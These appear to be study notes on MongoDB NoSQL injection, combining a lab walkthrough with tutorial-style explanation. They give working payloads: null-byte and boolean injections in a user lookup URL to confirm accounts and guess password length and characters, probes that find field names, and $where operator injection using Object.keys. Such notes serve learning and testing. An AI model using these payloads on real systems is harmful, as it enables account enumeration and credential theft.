So here the input we teste before are correctly sanitized, except for an endpoint which retrieves. data `/user/lookup?user=username`
So by this we could enumerate users. But as the single quote is forbidden we could bypass this with the null payload. Also the ampersands should be urlencoded to not display an error.
`/user/lookup?user=administrator'%26%261==1%00 `
this well display the user because the condition will be true, otherwise the user doesn't really exist. So now we know the administrator exists.

#### Guess the password
`/user/lookup?user=administrator'%26%26this.password.length=1%00`
By doing this we can get the length from the pasword
And then fuzzing all the lowercases charactes.
so we test all the possibly letters in the password string:
```
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
```
In burp or wfuzz we can fuzz that

#### Identifying field names

Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a `password` field, you could submit the following payload:

`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`

Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the `username` field exists, so you could send the following payloads:

`admin' && this.username!='` `admin' && this.foo!='`

If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).

If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through different potential field names.

#### Note

You can alternatively use NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack. We'll teach you how to do this in the next section.

## Exploiting NoSQL operator injection to extract data

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.

### Injecting operators in MongoDB

Consider a vulnerable application that accepts username and password in the body of a `POST` request:

`{"username":"wiener","password":"peter"}`

To test whether you can inject operators, you could try adding the `$where` operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:

`{"username":"wiener","password":"peter", "$where":"0"}``{"username":"wiener","password":"peter", "$where":"1"}`

If there is a difference between the responses, this may indicate that the JavaScript expression in the `$where` clause is being evaluated.

#### Extracting field names

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:

`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.